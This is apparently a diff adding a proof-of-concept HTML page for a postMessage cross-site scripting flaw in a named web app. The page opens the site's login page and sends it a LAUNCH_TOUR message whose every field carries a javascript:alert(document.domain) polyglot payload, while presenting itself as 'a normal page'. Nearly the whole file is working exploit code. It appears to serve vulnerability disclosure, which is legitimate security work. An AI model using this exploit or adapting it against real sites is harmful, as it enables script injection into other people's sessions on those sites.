@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Postmessage PoC</title>
+    <script>
+      let win = window.open("https://www.yotisign.com/app/account/login");
+      let msg =
+        '{\n    "TYPE": "LAUNCH_TOUR",\n    "segmentsList": "javascript:alert(document.domain)//3-\\\\\u003c\u003e\'\\":",\n    "cssSelector": "javascript:alert(document.domain)//3-\\\\\u003c\u003e\'\\":",\n    "tourUuid": "javascript:alert(document.domain)//3-\\\\\u003c\u003e\'\\":",\n    "startIndex": "javascript:alert(document.domain)//3-\\\\\u003c\u003e\'\\":",\n    "skipIfWasFinished": "javascript:alert(document.domain)//3-\\\\\u003c\u003e\'\\":",\n    "isRedirect": "javascript:alert(document.domain)//3-\\\\\u003c\u003e\'\\":",\n    "tourUrl": "javascript:alert(document.domain)//3-\\\\\u003c\u003e\'\\":"\n}';
+      msg = JSON.parse(msg);
+      setTimeout(function () {
+        win.postMessage(msg, "*");
+      }, 5000);
+    </script>
+  </head>
+  <body>
+    <h1>Hi this is a normal page !!!</h1>
+    >
+  </body>
+</html>
